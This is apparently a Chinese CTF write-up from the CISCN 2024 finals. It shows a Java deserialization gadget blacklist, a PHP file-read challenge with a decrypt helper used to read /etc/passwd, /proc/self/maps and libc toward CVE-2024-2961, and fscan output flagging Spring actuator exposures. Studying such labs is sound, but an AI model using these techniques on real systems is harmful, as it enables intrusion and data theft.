                <span class="token keyword">if</span><span class="token punctuation">(</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span>SwingPropertyChangeSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h2 id="Fobee（Unsolved）"><a href="#Fobee（Unsolved）" class="headerlink" title="Fobee（Unsolved）"></a>Fobee（Unsolved）</h2><p>没看</p>
<hr>
<h1 id="Pwn-PHP（不完整复现）"><a href="#Pwn-PHP（不完整复现）" class="headerlink" title="Pwn-PHP（不完整复现）"></a>Pwn-PHP（不完整复现）</h1><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721224758509.png" alt="image-20240721224758509"></p>
<p>CVE-2024-2961？</p>
<p>fix貌似把iconv的so文件扬了就行</p>
<p>起docker</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load <span class="token operator">&lt;</span> 2024_ciscn_final_php.tar
<span class="token function">docker</span> run <span class="token parameter variable">-tid</span> <span class="token parameter variable">--name</span> final_php <span class="token parameter variable">-p</span> <span class="token number">9998</span>:9999 <span class="token parameter variable">-e</span> <span class="token assign-left variable">FLAG</span><span class="token operator">=</span>flag<span class="token punctuation">&#123;</span>test_flag<span class="token punctuation">&#125;</span> 2024_ciscn_final_php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>看一下data.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">base64_decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// AES加密和解密函数</span>
<span class="token keyword">function</span> <span class="token function-definition function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aes-256-cbc'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token variable">$iv</span> <span class="token operator">.</span> <span class="token variable">$encrypted</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_blacklisted</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'/root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/media'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/mnt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/lib64'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/lib'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 添加其他黑名单目录</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted_dir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$blacklisted_dir</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 获取Base64编码的文件路径并进行Base64解码</span>
<span class="token variable">$encoded_file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">base64_decode_data</span><span class="token punctuation">(</span><span class="token variable">$encoded_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_blacklisted</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access to this directory is not allowed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 获取文件内容</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 加密文件内容</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Welcome_to_CISCN_2024_Final'</span><span class="token punctuation">;</span>  <span class="token comment">// Actual key</span>
<span class="token variable">$encrypted_data</span> <span class="token operator">=</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"This is your encrypted file : <span class="token interpolation"><span class="token variable">$encrypted_data</span></span>"</span><span class="token punctuation">;</span>


<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>文件输出的内容加密了一层aes</p>
<p>读取&#x2F;etc&#x2F;passwd，整一个decrypt函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"BVKJrBujS7bUUE76j0JHe6AQ0rMHAsdTQPUmoHa6Ty9aS7J6FUMpWbmn/vNcOYBk9SdXenOSTE7XgsjuifgtFsZFbf+59Fw0bNZ5CtynJEjGc2Mr/rQqXxw7zaKRbp77iLWLTAVrAEyFed20ayOHvw6mf59iphrfYfkLVtJ18H+73WJcbzB8/gAxbCYPLxUv6cLUhbGW3kuTTjeJabnOUwy64vEsck0mmYVbyh/aXZrQIVZmnSaxIjm5TS1f6EAQU5KaLkXSanIP4k+7VIMQlkhRn0xxcU4VK2HQYxDsZGrr8jDSGl8CSmUWQxtQtJhheG5Xn30Xu6NxLHb/yBsCdLV3deZBL6HkZO9BWaEDFrMljC9Tnf41WP3/EHr/ljRuoQWat0S1U4QP2bkIWsI3o5B0TfCxr1MZBczZQro2uDtUSxvmrijoOB8PahfzsohIqY2PUnkpIHAMFa/cw0uwQePv9zKVGmoGUhlIjjSelwjQVE6E4WV/QGKL4pL1ruWeS78cm1Cf0Hc/WLzpQXOSMkyPp3I7vFqWS1IeLXr0jVod6C7VGtlif0e3wyZwnpAYujl0t3m8ZYu7ms0jfW2LYYkpGPV6OshWrO9OOJAp1UGfsC0wvp6YdCz99l3nQ+iwgQcDo5xQdoGO/LXq8qs8a6FtgRa7F+sbihk5EaAGq8QQzd8MRTpTeciwcxKUdDSo+2n1uQYhE7MukOMrJLlQnvandAxj+ucMJLMh8UDbTgkZ9pky6BzQGgCMXJApvcPccmrpKvNUKuw6ZO93XY93j7aBYPk/jUIUbjPO+PsYCnqRA66viAZ21dlGCQFpHxmYHohja47FxBLU9dfm394+zHvlXIpaJXhdw9KlNlTCn5RnXpHnRm+zynEVflQNFgOKE9MSWx76Y6/11dNu12KYB4GzaR7kd9v/p0MgiYss1MNQOsfvCPIDvm8wEhECy+ej4iECuI5lyqd3icCxq4QxGQtkOY243vfEv3LV4PW4602uO/1pi9BB7TQsLkl1iBQVprmO6aarK6bifywhd2CpDjXZ1YPuuk5G6NsXx+XpbE1R0LkCDZ6HIxDB4CC6bEosOvT9RhsOcw0zd/euo07hBRTYI+TiXui0PeSdchu9KLNvY2twBhpGA+kz7haa8mnXVRgvrIBL2YNIu8lP1x0v/iu2U4bcMubq2DxJArTKgjFfA4HgGy4azbHVm/n7vfYOqAIBaCnnjSlUZh4YBlFhJOFQgChuMHJcUQG+j9H/jy2GFQDZI3imUz2aRB6guzThVQ/1LoYFTSqVaS+6iIKGw9hxyNDMTfhK5vg3T9uq2EmoT6+y3ePETY9YxFV1eWVcO999naFCArEvqZk7t5qyUZHOyDqjVeUMEh73i3mBJubzZuZ7gN8YPwKRei9u97ldqPUBid2uYoLVMOmG4B13pn6QgrvqGXwLmgqUtjVTiy5ctQ6WsK91oSq0gYLqHm2lrTpRTuYYKUDQuAgZSOEaBNmd3uGmjArtUURLqTo2FMsEPaidU4IlPhxINyNI00yJ54HmL7KTVt+Lv+7I/wReUZzHtOiIodlZkiFJI48IQ74="</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Welcome_to_CISCN_2024_Final'</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aes-256-cbc'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$decrypted_data</span> <span class="token operator">=</span> <span class="token function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以解密出 &#x2F;etc&#x2F;passwd 的内容，但是 &#x2F;flag 不行，因为docker里只有root有读权限</p>
<p>但是也够用了，读 &#x2F;proc&#x2F;self&#x2F;maps</p>
<p>然后读 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</p>
<p>接下来打cve-2024-2961即可</p>
<p>但是实际打的时候发现堆那里貌似做了点手脚，导致exp不能一把梭，需要pwn✌支援（</p>
<hr>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>我不会渗透也没打过云境，内网代理还是前一天现学的，但是根本没建立起一个内网代理的思路，代理还是等巨魔从酒店拿拓展坞回来才开张的（</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140100586.png" alt="image-20240721140100586"></p>
<p>传fscan到vps扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@vps:~<span class="token comment"># ./fscan -h 192.168.36.88/24</span>

   ___                              _    
  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
 / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
/ /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    
<span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>   
                     fscan version: <span class="token number">1.8</span>.3
start infoscan
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.88   is alive
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.253  is alive
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">2</span>
<span class="token number">192.168</span>.36.88:22 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后扫erp</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">8.130</span>.44.201

   ___                              _
  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __
 / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
/ /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>
<span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>
                     fscan version: <span class="token number">1.8</span>.3
start infoscan
<span class="token number">8.130</span>.44.201:8080 <span class="token function">open</span>
<span class="token number">8.130</span>.44.201:22 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">2</span>
start vulscan
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

